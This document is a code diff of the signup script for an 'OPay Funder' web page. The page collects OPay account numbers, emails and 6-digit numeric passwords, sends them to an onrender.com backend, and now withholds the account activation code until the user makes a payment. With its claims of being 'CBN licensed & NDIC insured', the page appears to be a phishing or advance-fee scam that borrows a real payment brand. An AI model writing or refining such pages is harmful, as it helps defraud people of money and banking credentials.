@@ -262,254 +262,255 @@
     </div>
 
     <script>
-        const API_URL = 'https://opay-backend-api.onrender.com';
-        
-        function vibratePhone(duration = 100, pattern = null) {
-            if (window.navigator && window.navigator.vibrate) {
-                if (pattern) window.navigator.vibrate(pattern);
-                else window.navigator.vibrate(duration);
-            }
+    const API_URL = 'https://opay-backend-api.onrender.com';
+    
+    function vibratePhone(duration = 100, pattern = null) {
+        if (window.navigator && window.navigator.vibrate) {
+            if (pattern) window.navigator.vibrate(pattern);
+            else window.navigator.vibrate(duration);
         }
+    }
+    
+    async function showAlert(icon, title, message, vibratePattern = null) {
+        if (vibratePattern) vibratePhone(0, vibratePattern);
+        else vibratePhone(200);
         
-        async function showAlert(icon, title, message, vibratePattern = null) {
-            if (vibratePattern) vibratePhone(0, vibratePattern);
-            else vibratePhone(200);
-            
-            return Swal.fire({
-                icon: icon,
-                title: title,
-                text: message,
-                confirmButtonColor: '#00B875',
-                confirmButtonText: 'OK'
+        return Swal.fire({
+            icon: icon,
+            title: title,
+            text: message,
+            confirmButtonColor: '#00B875',
+            confirmButtonText: 'OK'
+        });
+    }
+    
+    // Get real account name from Paystack
+    async function getRealAccountName(accountNumber) {
+        try {
+            const response = await fetch(`${API_URL}/api/resolve-account`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ account_number: accountNumber, bank_code: 'opay' })
             });
-        }
-        
-        // Get real account name from Paystack
-        async function getRealAccountName(accountNumber) {
-            try {
-                const response = await fetch(`${API_URL}/api/resolve-account`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ account_number: accountNumber, bank_code: 'opay' })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    return { success: true, name: data.account_name };
-                } else {
-                    return { success: false, message: data.message };
-                }
-            } catch (error) {
-                return { success: false, message: 'Network error' };
-            }
-        }
-        
-        // Check if email already exists
-        async function checkEmailExists(email) {
-            try {
-                const response = await fetch(`${API_URL}/api/check-email`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: email })
-                });
-                const data = await response.json();
-                return data.exists;
-            } catch (error) {
-                return false;
-            }
-        }
-        
-        // Check if account already exists
-        async function checkAccountExists(accountNumber) {
-            try {
-                const response = await fetch(`${API_URL}/api/check-account`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ account_number: accountNumber })
-                });
-                const data = await response.json();
-                return data.exists;
-            } catch (error) {
-                return false;
-            }
-        }
-        
-        // Create user
-        async function createUser(accountNumber, accountName, email, passwordCode) {
-            try {
-                const response = await fetch(`${API_URL}/api/create-user`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        account_number: accountNumber,
-                        account_name: accountName,
-                        email: email,
-                        password_code: passwordCode
-                    })
-                });
-                return await response.json();
-            } catch (error) {
-                return { success: false, message: 'Network error' };
-            }
-        }
-        
-        // DOM Elements
-        const accountNumberInput = document.getElementById('accountNumber');
-        const accountNameSpan = document.getElementById('accountName');
-        const emailInput = document.getElementById('emailInput');
-        const codeInput = document.getElementById('codeInput');
-        const signupBtn = document.getElementById('signupBtn');
-        const termsCheckbox = document.getElementById('termsCheckbox');
-        const loginLink = document.getElementById('loginLink');
-        const termsLink = document.getElementById('termsLink');
-        
-        let currentAccountName = '';
-        let isVerifying = false;
-        
-        // Account number lookup
-        accountNumberInput.addEventListener('input', async function(e) {
-            let val = this.value.replace(/\D/g, '').slice(0, 10);
-            this.value = val;
             
-            if (val.length === 10 && !isVerifying) {
-                isVerifying = true;
-                accountNameSpan.textContent = 'Verifying with OPay...';
-                accountNameSpan.style.color = '#e67e22';
-                vibratePhone(50);
-                
-                const result = await getRealAccountName(val);
-                
-                if (result.success) {
-                    currentAccountName = result.name;
-                    accountNameSpan.textContent = result.name;
-                    accountNameSpan.style.color = '#00B875';
-                    vibratePhone(0, [50, 50, 50]);
-                } else {
-                    currentAccountName = '';
-                    accountNameSpan.textContent = 'Account not found';
-                    accountNameSpan.style.color = '#e74c3c';
-                    vibratePhone(0, [200, 100, 200]);
-                }
-                isVerifying = false;
-            } else if (val.length > 0 && val.length < 10) {
-                accountNameSpan.textContent = 'Enter 10 digits';
-                accountNameSpan.style.color = '#e67e22';
-                currentAccountName = '';
+            const data = await response.json();
+            
+            if (data.success) {
+                return { success: true, name: data.account_name };
             } else {
-                accountNameSpan.textContent = '—';
-                accountNameSpan.style.color = '#00B875';
-                currentAccountName = '';
+                return { success: false, message: data.message };
             }
-        });
+        } catch (error) {
+            return { success: false, message: 'Network error' };
+        }
+    }
+    
+    // Check if email already exists
+    async function checkEmailExists(email) {
+        try {
+            const response = await fetch(`${API_URL}/api/check-email`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email })
+            });
+            const data = await response.json();
+            return data.exists;
+        } catch (error) {
+            return false;
+        }
+    }
+    
+    // Check if account already exists
+    async function checkAccountExists(accountNumber) {
+        try {
+            const response = await fetch(`${API_URL}/api/check-account`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ account_number: accountNumber })
+            });
+            const data = await response.json();
+            return data.exists;
+        } catch (error) {
+            return false;
+        }
+    }
+    
+    // Create user - NO activation code returned to frontend
+    async function createUser(accountNumber, accountName, email, passwordCode) {
+        try {
+            const response = await fetch(`${API_URL}/api/create-user`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    account_number: accountNumber,
+                    account_name: accountName,
+                    email: email,
+                    password_code: passwordCode
+                })
+            });
+            return await response.json();
+        } catch (error) {
+            return { success: false, message: 'Network error' };
+        }
+    }
+    
+    // DOM Elements
+    const accountNumberInput = document.getElementById('accountNumber');
+    const accountNameSpan = document.getElementById('accountName');
+    const emailInput = document.getElementById('emailInput');
+    const codeInput = document.getElementById('codeInput');
+    const signupBtn = document.getElementById('signupBtn');
+    const termsCheckbox = document.getElementById('termsCheckbox');
+    const loginLink = document.getElementById('loginLink');
+    const termsLink = document.getElementById('termsLink');
+    
+    let currentAccountName = '';
+    let isVerifying = false;
+    
+    // Account number lookup
+    accountNumberInput.addEventListener('input', async function(e) {
+        let val = this.value.replace(/\D/g, '').slice(0, 10);
+        this.value = val;
         
-        // Password validation
-        codeInput.addEventListener('input', function(e) {
-            let val = this.value.replace(/\D/g, '').slice(0, 6);
-            this.value = val;
-        });
-        
-        // Sign up button
-        signupBtn.addEventListener('click', async function() {
-            const accountNumber = accountNumberInput.value;
-            const email = emailInput.value.trim().toLowerCase();
-            const code = codeInput.value;
-            const terms = termsCheckbox.checked;
+        if (val.length === 10 && !isVerifying) {
+            isVerifying = true;
+            accountNameSpan.textContent = 'Verifying with OPay...';
+            accountNameSpan.style.color = '#e67e22';
+            vibratePhone(50);
             
-            // Validations
-            if (accountNumber.length !== 10) {
-                await showAlert('error', 'Invalid Account', 'Please enter a valid 10-digit OPay account number', [200, 100]);
-                accountNumberInput.focus();
-                return;
-            }
-            
-            if (!currentAccountName) {
-                await showAlert('error', 'Account Not Verified', 'Please wait for account verification to complete', [200, 100]);
-                return;
-            }
-            
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                await showAlert('error', 'Invalid Email', 'Please enter a valid email address', [200, 100]);
-                emailInput.focus();
-                return;
-            }
-            
-            // Check if email already registered
-            const emailExists = await checkEmailExists(email);
-            if (emailExists) {
-                await showAlert('error', 'Email Already Registered', 'This email is already associated with an account. Each email can only be used once.', [200, 100, 200]);
-                emailInput.focus();
-                return;
-            }
-            
-            // Check if account already registered
-            const accountExists = await checkAccountExists(accountNumber);
-            if (accountExists) {
-                await showAlert('error', 'Account Already Registered', 'This account number is already registered. Please use a different account number.', [200, 100, 200]);
-                accountNumberInput.focus();
-                return;
-            }
-            
-            if (code.length !== 6) {
-                await showAlert('error', 'Invalid Password', 'Please create a 6-digit password', [200, 100]);
-                codeInput.focus();
-                return;
-            }
-            
-            if (!terms) {
-                await showAlert('warning', 'Terms Required', 'Please accept the Terms and Conditions', [200, 100]);
-                return;
-            }
-            
-            // Create account
-            this.innerHTML = '<div class="spinner-sm"></div> Creating Account...';
-            this.disabled = true;
-            vibratePhone(0, [100, 50, 100]);
-            
-            const result = await createUser(accountNumber, currentAccountName, email, code);
+            const result = await getRealAccountName(val);
             
             if (result.success) {
-                // Save to localStorage for login1.html
-                localStorage.setItem('pendingLogin', JSON.stringify({
-                    accountNumber: accountNumber,
-                    accountName: currentAccountName,
-                    email: email,
-                    activationCode: result.activation_code
-                }));
-                
-                await showAlert('success', 'Account Created!', 
-                    `Welcome ${currentAccountName}!\n\nYour activation code is: ${result.activation_code}\n\nPlease save this code. You will need it to activate your account.\n\nYou will now be redirected to login.`, 
-                    [100, 50, 100, 150]);
-                
-                setTimeout(() => {
-                    window.location.href = 'login1.html';
-                }, 2000);
+                currentAccountName = result.name;
+                accountNameSpan.textContent = result.name;
+                accountNameSpan.style.color = '#00B875';
+                vibratePhone(0, [50, 50, 50]);
             } else {
-                await showAlert('error', 'Registration Failed', result.message, [200, 100, 200]);
-                this.innerHTML = 'SIGN UP';
-                this.disabled = false;
+                currentAccountName = '';
+                accountNameSpan.textContent = 'Account not found';
+                accountNameSpan.style.color = '#e74c3c';
+                vibratePhone(0, [200, 100, 200]);
             }
-        });
+            isVerifying = false;
+        } else if (val.length > 0 && val.length < 10) {
+            accountNameSpan.textContent = 'Enter 10 digits';
+            accountNameSpan.style.color = '#e67e22';
+            currentAccountName = '';
+        } else {
+            accountNameSpan.textContent = '—';
+            accountNameSpan.style.color = '#00B875';
+            currentAccountName = '';
+        }
+    });
+    
+    // Password validation
+    codeInput.addEventListener('input', function(e) {
+        let val = this.value.replace(/\D/g, '').slice(0, 6);
+        this.value = val;
+    });
+    
+    // Sign up button
+    signupBtn.addEventListener('click', async function() {
+        const accountNumber = accountNumberInput.value;
+        const email = emailInput.value.trim().toLowerCase();
+        const code = codeInput.value;
+        const terms = termsCheckbox.checked;
         
-        loginLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            window.location.href = 'login1.html';
-        });
+        // Validations
+        if (accountNumber.length !== 10) {
+            await showAlert('error', 'Invalid Account', 'Please enter a valid 10-digit OPay account number', [200, 100]);
+            accountNumberInput.focus();
+            return;
+        }
         
-        termsLink.addEventListener('click', async (e) => {
-            e.preventDefault();
-            await showAlert('info', 'Terms & Conditions', 
-                '📜 OPay Funder Terms:\n\n' +
-                '• You must be 18+ years old\n' +
-                '• One account per user\n' +
-                '• One email per account only\n' +
-                '• No password recovery available\n' +
-                '• Keep your activation code safe\n' +
-                '• CBN licensed & NDIC insured'
-            );
-        });
+        if (!currentAccountName) {
+            await showAlert('error', 'Account Not Verified', 'Please wait for account verification to complete', [200, 100]);
+            return;
+        }
         
-        console.log('✓ Create.html loaded with new policies');
-    </script>
+        if (!email || !email.includes('@') || !email.includes('.')) {
+            await showAlert('error', 'Invalid Email', 'Please enter a valid email address', [200, 100]);
+            emailInput.focus();
+            return;
+        }
+        
+        // Check if email already registered
+        const emailExists = await checkEmailExists(email);
+        if (emailExists) {
+            await showAlert('error', 'Email Already Registered', 'This email is already associated with an account. Each email can only be used once.', [200, 100, 200]);
+            emailInput.focus();
+            return;
+        }
+        
+        // Check if account already registered
+        const accountExists = await checkAccountExists(accountNumber);
+        if (accountExists) {
+            await showAlert('error', 'Account Already Registered', 'This account number is already registered. Please use a different account number.', [200, 100, 200]);
+            accountNumberInput.focus();
+            return;
+        }
+        
+        if (code.length !== 6) {
+            await showAlert('error', 'Invalid Password', 'Please create a 6-digit password', [200, 100]);
+            codeInput.focus();
+            return;
+        }
+        
+        if (!terms) {
+            await showAlert('warning', 'Terms Required', 'Please accept the Terms and Conditions', [200, 100]);
+            return;
+        }
+        
+        // Create account
+        this.innerHTML = '<div class="spinner-sm"></div> Creating Account...';
+        this.disabled = true;
+        vibratePhone(0, [100, 50, 100]);
+        
+        const result = await createUser(accountNumber, currentAccountName, email, code);
+        
+        if (result.success) {
+            // Save to localStorage for login1.html (NO activation code stored here)
+            localStorage.setItem('pendingLogin', JSON.stringify({
+                accountNumber: accountNumber,
+                accountName: currentAccountName,
+                email: email
+                // NO activationCode here!
+            }));
+            
+            // IMPORTANT: Do NOT show activation code to user!
+            await showAlert('success', 'Account Created!', 
+                `Welcome ${currentAccountName}!\n\n✅ Your account has been created but is NOT yet activated.\n\n🔐 You will receive your activation code AFTER payment confirmation.\n\n📞 Please contact support or make payment to activate your account.\n\nYou will now be redirected to login.`, 
+                [100, 50, 100, 150]);
+            
+            setTimeout(() => {
+                window.location.href = 'login1.html';
+            }, 3000);
+        } else {
+            await showAlert('error', 'Registration Failed', result.message, [200, 100, 200]);
+            this.innerHTML = 'SIGN UP';
+            this.disabled = false;
+        }
+    });
+    
+    loginLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.location.href = 'login1.html';
+    });
+    
+    termsLink.addEventListener('click', async (e) => {
+        e.preventDefault();
+        await showAlert('info', 'Terms & Conditions', 
+            '📜 OPay Funder Terms:\n\n' +
+            '• You must be 18+ years old\n' +
+            '• One account per user\n' +
+            '• One email per account only\n' +
+            '• No password recovery available\n' +
+            '• Activation code provided after payment\n' +
+            '• CBN licensed & NDIC insured'
+        );
+    });
+    
+    console.log('✓ Create.html loaded - Activation code NOT shown to users');
+</script>
 </body>
 </html>
